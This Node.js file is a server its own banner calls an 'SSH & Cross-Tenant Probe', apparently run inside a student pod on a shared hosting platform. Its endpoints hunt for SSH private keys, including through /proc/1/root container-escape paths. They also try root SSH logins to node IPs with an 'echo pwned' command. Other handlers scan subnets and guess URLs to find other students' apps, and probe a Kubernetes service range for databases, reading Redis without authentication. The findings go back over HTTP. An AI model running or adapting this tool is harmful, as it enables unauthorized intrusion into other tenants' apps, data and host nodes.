const http = require("http");
const https = require("https");
const net = require("net");
const os = require("os");
const fs = require("fs");
const dns = require("dns");
const { execSync, spawn } = require("child_process");

let results = {};

// Comprehensive SSH access check
async function sshCheck() {
  results.ssh = { 
    binaries: {},
    keys: [],
    servers: [],
    nodeAccess: []
  };
  
  // Check all SSH-related binaries
  const binaries = ["ssh", "sshd", "ssh-keygen", "ssh-agent", "scp", "sftp", "nc", "ncat"];
  for (const bin of binaries) {
    try {
      const path = execSync(`which ${bin} 2>/dev/null || true`, { timeout: 5000 }).toString().trim();
      if (path) results.ssh.binaries[bin] = path;
    } catch(e) {}
  }
  
  // Check SSH version
  try {
    results.ssh.sshVersion = execSync("ssh -V 2>&1 || true", { timeout: 5000 }).toString().trim();
  } catch(e) {}
  
  // Search for SSH keys everywhere
  const keyPaths = [
    "/root/.ssh", "/home/*/.ssh", "/etc/ssh",
    "/proc/1/root/root/.ssh", "/proc/1/root/home/*/.ssh",
    "/proc/1/root/etc/ssh", "/app/.ssh", "/tmp"
  ];
  
  for (const pattern of keyPaths) {
    try {
      const expanded = execSync(`ls -la ${pattern} 2>/dev/null || true`, { timeout: 5000 }).toString().trim();
      if (expanded && !expanded.includes("No such file")) {
        results.ssh.keys.push({ path: pattern, listing: expanded.substring(0, 500) });
      }
    } catch(e) {}
  }
  
  // Find SSH-related files
  try {
    const sshFiles = execSync("find / -name '*ssh*' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'authorized_keys' 2>/dev/null | head -50 || true", { timeout: 30000 }).toString().trim();
    if (sshFiles) {
      results.ssh.foundFiles = sshFiles.split("\n").filter(f => f);
    }
  } catch(e) {}
  
  // Scan for SSH servers on node IPs
  const nodeIPs = [
    "192.168.66.176", "192.168.66.177", "192.168.66.178",
    "10.0.0.1", "10.0.1.1", "10.0.2.1"
  ];
  
  // Also scan the gateway
  try {
    const routes = execSync("ip route 2>/dev/null || route -n 2>/dev/null || true", { timeout: 5000 }).toString();
    const gw = routes.match(/default via (\d+\.\d+\.\d+\.\d+)/)?.[1];
    if (gw) nodeIPs.push(gw);
    results.ssh.gateway = gw;
  } catch(e) {}
  
  for (const ip of nodeIPs) {
    const open = await scanPort(ip, 22, 200);
    if (open) {
      results.ssh.servers.push(ip);
      
      // Try to SSH (will fail but shows capability)
      try {
        const sshResult = execSync(`timeout 3 ssh -o StrictHostKeyChecking=no -o BatchMode=yes root@${ip} echo pwned 2>&1 || true`, { timeout: 5000 }).toString();
        results.ssh.nodeAccess.push({ ip, result: sshResult.substring(0, 200) });
      } catch(e) {}
    }
  }
  
  // Check if we can create SSH tunnel
  results.ssh.tunnelCapable = !!(results.ssh.binaries.ssh || results.ssh.binaries.nc);
}

// Find other student pods/apps
async function findOtherStudents() {
  results.students = {
    pods: [],
    services: [],
    apps: []
  };
  
  const myIP = Object.values(os.networkInterfaces()).flat().find(i => i.family === "IPv4" && !i.internal)?.address;
  results.students.myIP = myIP;
  
  if (!myIP) return;
  
  const [b1, b2, b3] = myIP.split(".");
  
  // Scan pod network comprehensively
  const portsToCheck = [3000, 8080, 80, 5000, 4000, 8000, 9000];
  
  // Same subnet first
  for (let h = 1; h <= 254; h++) {
    const ip = `${b1}.${b2}.${b3}.${h}`;
    if (ip === myIP) continue;
    
    for (const port of portsToCheck) {
      const open = await scanPort(ip, port, 30);
      if (open) {
        const info = { ip, port };
        
        // Probe the app
        try {
          const resp = await httpGet(`http://${ip}:${port}/`, 1000);
          info.status = resp.status;
          info.server = resp.headers?.server;
          info.body = resp.body?.substring(0, 200);
          
          // Check if it's another student app
          if (resp.body?.includes("student") || resp.body?.includes("kuros")) {
            info.isStudentApp = true;
          }
        } catch(e) {}
        
        results.students.pods.push(info);
      }
    }
  }
  
  // Adjacent subnets
  for (let offset = -10; offset <= 10; offset++) {
    if (offset === 0) continue;
    const subnet = parseInt(b3) + offset;
    if (subnet < 0 || subnet > 255) continue;
    
    for (let h = 1; h <= 50; h++) {
      const ip = `${b1}.${b2}.${subnet}.${h}`;
      
      for (const port of [3000, 80]) {
        const open = await scanPort(ip, port, 20);
        if (open) {
          try {
            const resp = await httpGet(`http://${ip}:${port}/`, 500);
            results.students.pods.push({
              ip, port,
              status: resp.status,
              body: resp.body?.substring(0, 100)
            });
          } catch(e) {
            results.students.pods.push({ ip, port });
          }
        }
      }
    }
  }
  
  // Discover via DNS - student namespace services
  const namespaces = [
    "student-6aba8ad7f3079260b62ed1e2", // Our namespace
    "default", "kuros", "production"
  ];
  
  for (const ns of namespaces) {
    // Try to enumerate services via DNS
    try {
      const srvRecords = await new Promise((r, j) => {
        dns.resolveSrv(`_http._tcp.${ns}.svc.cluster.local`, (e, a) => e ? j(e) : r(a));
      });
      results.students.services.push({ namespace: ns, type: "srv", records: srvRecords });
    } catch(e) {}
    
    // Try common service names
    const svcNames = ["app", "web", "api", "backend", "frontend"];
    for (const svc of svcNames) {
      try {
        const addrs = await new Promise((r, j) => {
          dns.resolve4(`${svc}.${ns}.svc.cluster.local`, (e, a) => e ? j(e) : r(a));
        });
        results.students.services.push({ name: `${svc}.${ns}`, ips: addrs });
      } catch(e) {}
    }
  }
  
  // Try to access other student URLs directly via ingress
  const userIdPrefixes = ["6ab", "6ac", "6ad", "6ae", "6af"];
  const appNames = ["test", "app", "web", "api", "demo"];
  
  for (const prefix of userIdPrefixes) {
    for (let i = 0; i < 16; i++) {
      const userId = `${prefix}${i.toString(16)}8ad7f3079260b62ed1e2`;
      
      for (const app of appNames) {
        const url = `https://${app}-student-${userId}.kuros.cryboy.in`;
        
        try {
          const resp = await new Promise((resolve, reject) => {
            https.get(url, { timeout: 2000, rejectUnauthorized: false }, res => {
              let body = "";
              res.on("data", c => body += c);
              res.on("end", () => resolve({ status: res.statusCode, body: body.substring(0, 100) }));
            }).on("error", reject);
          });
          
          if (resp.status !== 404 && resp.status !== 503) {
            results.students.apps.push({ url, status: resp.status, body: resp.body });
          }
        } catch(e) {}
      }
    }
  }
}

// Try to access shared databases
async function sharedDatabases() {
  results.databases = { discovered: [], accessible: [] };
  
  // Common database ports and their default credentials
  const dbTargets = [
    { port: 5432, name: "PostgreSQL", testCmd: "psql" },
    { port: 3306, name: "MySQL", testCmd: "mysql" },
    { port: 27017, name: "MongoDB", testCmd: "mongo" },
    { port: 6379, name: "Redis", testCmd: "redis-cli" }
  ];
  
  // Scan K8s service CIDR for databases
  for (let i = 0; i <= 255; i += 4) {
    for (let j = 1; j <= 255; j += 8) {
      const ip = `10.100.${i}.${j}`;
      
      for (const db of dbTargets) {
        const open = await scanPort(ip, db.port, 30);
        if (open) {
          results.databases.discovered.push({ ip, port: db.port, type: db.name });
          
          // Try to connect
          try {
            if (db.name === "Redis") {
              // Redis often allows unauthenticated access
              const socket = new net.Socket();
              await new Promise((resolve) => {
                socket.on("connect", () => {
                  socket.write("INFO\r\n");
                  socket.on("data", (data) => {
                    results.databases.accessible.push({
                      ip, port: db.port, type: "Redis",
                      response: data.toString().substring(0, 200)
                    });
                    socket.destroy();
                    resolve();
                  });
                });
                socket.on("error", resolve);
                socket.setTimeout(2000);
                socket.on("timeout", () => { socket.destroy(); resolve(); });
                socket.connect(db.port, ip);
              });
            }
          } catch(e) {}
        }
      }
    }
  }
}

async function scanPort(host, port, timeout = 100) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

async function httpGet(url, timeout = 2000) {
  return new Promise((resolve, reject) => {
    const proto = url.startsWith("https") ? https : http;
    const req = proto.get(url, { timeout, rejectUnauthorized: false }, res => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
  });
}

const server = http.createServer(async (req, res) => {
  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
  
  try {
    if (req.url === "/ssh") await sshCheck();
    else if (req.url === "/students") await findOtherStudents();
    else if (req.url === "/databases") await sharedDatabases();
    else if (req.url === "/all") {
      await sshCheck();
      await findOtherStudents();
      await sharedDatabases();
    }
    
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(results, null, 2));
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("SSH & Cross-Tenant Probe on port " + (process.env.PORT || 3000));
